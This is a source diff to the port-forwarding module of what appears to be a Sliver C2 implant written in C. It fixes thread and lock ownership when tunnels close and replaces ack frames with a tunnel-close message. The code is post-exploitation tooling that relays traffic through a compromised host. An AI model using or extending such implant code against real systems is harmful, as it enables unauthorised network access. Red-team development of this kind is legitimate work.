@@ -27,6 +27,8 @@ typedef struct {
   uint8_t pending[8192];
   size_t pending_len;
   volatile int stop;
+  int thread_running;
+  int closing;
   sliver_mutex_t *lock;
 } portfwd_t;
 
@@ -34,25 +36,52 @@ typedef int (*sliver_portfwd_send_fn)(uint32_t type, const void *data, size_t le
 
 static portfwd_t g_forwards[SLIVER_MAX_PORTFWDS];
 static sliver_portfwd_send_fn g_send = NULL;
+static sliver_mutex_t *g_portfwd_lock = NULL;
+
+static void portfwd_lock(void) {
+  if (g_portfwd_lock == NULL) {
+    g_portfwd_lock = sliver_mutex_create();
+  }
+  if (g_portfwd_lock != NULL) {
+    sliver_mutex_lock(g_portfwd_lock);
+  }
+}
+
+static void portfwd_unlock(void) {
+  if (g_portfwd_lock != NULL) {
+    sliver_mutex_unlock(g_portfwd_lock);
+  }
+}
 
 void sliver_portfwd_set_sender(sliver_portfwd_send_fn fn) { g_send = fn; }
 
 static portfwd_t *forward_find(uint64_t id) {
   for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
-    if (g_forwards[i].used && g_forwards[i].id == id) {
+    if (g_forwards[i].used && !g_forwards[i].closing && g_forwards[i].id == id) {
       return &g_forwards[i];
     }
   }
   return NULL;
 }
 
+/* Releases a forward. While its relay thread still runs the thread owns the
+ * socket/lock: destroying them here would leave it blocking on a freed mutex. */
 static void forward_release(portfwd_t *f) {
   if (f == NULL || !f->used) {
     return;
   }
   f->stop = 1;
+  portfwd_lock();
+  if (f->thread_running) {
+    f->closing = 1;
+    if (f->sock != NULL) {
+      sliver_socket_close(f->sock);
+      f->sock = NULL;
+    }
+    portfwd_unlock();
+    return;
+  }
   if (f->sock != NULL) {
-    /* Closing the socket unblocks the relay thread's recv. */
     sliver_socket_close(f->sock);
     f->sock = NULL;
   }
@@ -60,12 +89,20 @@ static void forward_release(portfwd_t *f) {
     sliver_mutex_destroy(f->lock);
   }
   memset(f, 0, sizeof(*f));
+  portfwd_unlock();
 }
 
 void sliver_portfwd_shutdown(void) {
+  portfwd_lock();
   for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
-    forward_release(&g_forwards[i]);
+    g_forwards[i].stop = 1;
+    g_forwards[i].closing = 1;
+    if (g_forwards[i].sock != NULL) {
+      sliver_socket_close(g_forwards[i].sock);
+      g_forwards[i].sock = NULL;
+    }
   }
+  portfwd_unlock();
 }
 
 static int forward_send_data(portfwd_t *f, const void *data, size_t len, int closed) {
@@ -79,7 +116,8 @@ static int forward_send_data(portfwd_t *f, const void *data, size_t len, int clo
   if (f->lock != NULL) {
     sliver_mutex_lock(f->lock);
   }
-  rc = sliver_tunnel_data_encode(&msg, data, len, closed, f->sequence, f->id, 0);
+  (void)closed; /* closing goes through MsgTunnelClose */
+  rc = sliver_tunnel_data_encode(&msg, data, len, 0, f->sequence, f->id, f->read_sequence);
   if (rc == 0) {
     rc = g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
     if (rc == 0) {
@@ -93,39 +131,30 @@ static int forward_send_data(portfwd_t *f, const void *data, size_t len, int clo
   return rc;
 }
 
-/* Tells the peer this tunnel generation is live. Sliver only relays client bytes
- * to an implant tunnel after the implant has produced a frame on it (the client
- * waits for Bound()), so a silent tunnel receives nothing at all. */
-static void forward_ready(portfwd_t *f) {
+/* Terminal: MsgTunnelClose{Closed, Sequence = exclusive prefix}. */
+static int forward_close(portfwd_t *f) {
   sliver_buf_t msg;
+  int rc;
   if (g_send == NULL) {
-    return;
+    return -1;
   }
   sliver_buf_init(&msg);
-  if (sliver_tunnel_data_encode(&msg, NULL, 0, 0, f->sequence, f->id, 0) == 0) {
-    (void)g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
+  if (sliver_tunnel_close_encode(&msg, f->sequence, f->id) != 0) {
+    sliver_buf_free(&msg);
+    return -1;
   }
+  rc = g_send(SLIVER_MSG_TUNNEL_CLOSE, msg.data, msg.len);
   sliver_buf_free(&msg);
-}
-
-static void forward_ack(portfwd_t *f) {
-  sliver_buf_t msg;
-  if (g_send == NULL) {
-    return;
-  }
-  sliver_buf_init(&msg);
-  if (sliver_tunnel_data_encode(&msg, NULL, 0, 0, f->sequence, f->id, f->read_sequence) == 0) {
-    (void)g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
-  }
-  sliver_buf_free(&msg);
+  return rc;
 }
 
 static void forward_thread(void *arg) {
   portfwd_t *f = (portfwd_t *)arg;
+  sliver_socket_t *sock = f->sock;
   char buf[SLIVER_PORTFWD_CHUNK];
 
   while (!f->stop) {
-    long n = sliver_socket_recv(f->sock, buf, sizeof(buf));
+    long n = sliver_socket_recv(sock, buf, sizeof(buf));
     if (n == 0) {
       break;
     }
@@ -141,8 +170,23 @@ static void forward_thread(void *arg) {
       break;
     }
   }
-  LOG_INFO("portfwd: closing tunnel=%llu (socket EOF)", (unsigned long long)f->id);
-  (void)forward_send_data(f, NULL, 0, 1);
+  if (!f->stop) {
+    LOG_INFO("portfwd: closing tunnel=%llu (socket EOF)", (unsigned long long)f->id);
+    (void)forward_close(f);
+  }
+  /* The relay thread owns the socket and the entry until it exits. */
+  portfwd_lock();
+  if (sock != NULL) {
+    sliver_socket_close(sock);
+  }
+  f->sock = NULL;
+  if (f->lock != NULL) {
+    sliver_mutex_destroy(f->lock);
+    f->lock = NULL;
+  }
+  f->thread_running = 0;
+  memset(f, 0, sizeof(*f));
+  portfwd_unlock();
 }
 
 /* The client creates the tunnel server-side and binds it by sending a zero byte
@@ -239,13 +283,14 @@ int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out) {
     if (f->lock == NULL) {
       f->lock = sliver_mutex_create();
     }
-    forward_ready(f);
     if (f->pending_len != 0) {
       LOG_DEBUG("portfwd: flushing %u buffered bytes", (unsigned)f->pending_len);
       (void)sliver_socket_send(f->sock, f->pending, f->pending_len);
       f->pending_len = 0;
     }
+    f->thread_running = 1;
     if (sliver_thread_create(forward_thread, f) == NULL) {
+      f->thread_running = 0;
       forward_release(f);
       return -1;
     }
@@ -268,7 +313,9 @@ int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out) {
   f->lock = sliver_mutex_create();
   LOG_INFO("portfwd: connected %s:%u tunnel=%llu", host, (unsigned)port,
            (unsigned long long)id);
+  f->thread_running = 1;
   if (sliver_thread_create(forward_thread, f) == NULL) {
+    f->thread_running = 0;
     forward_release(f);
     return -1;
   }
@@ -300,7 +347,6 @@ int sliver_portfwd_tunnel_data(const sliver_tunnel_data_t *td) {
       f->pending_len += take;
       LOG_DEBUG("portfwd: buffered %u bytes until the socket is ready", (unsigned)take);
     }
-    forward_ack(f);
     return 1;
   }
   if (td->sequence == f->read_sequence) {
@@ -314,7 +360,6 @@ int sliver_portfwd_tunnel_data(const sliver_tunnel_data_t *td) {
     }
     f->read_sequence++;
   }
-  forward_ack(f);
   return 1;
 }
 
@@ -326,6 +371,10 @@ int sliver_portfwd_tunnel_close(uint64_t tunnel_id) {
   forward_release(f);
   return 1;
 }
+
+
+
+
 
 
 
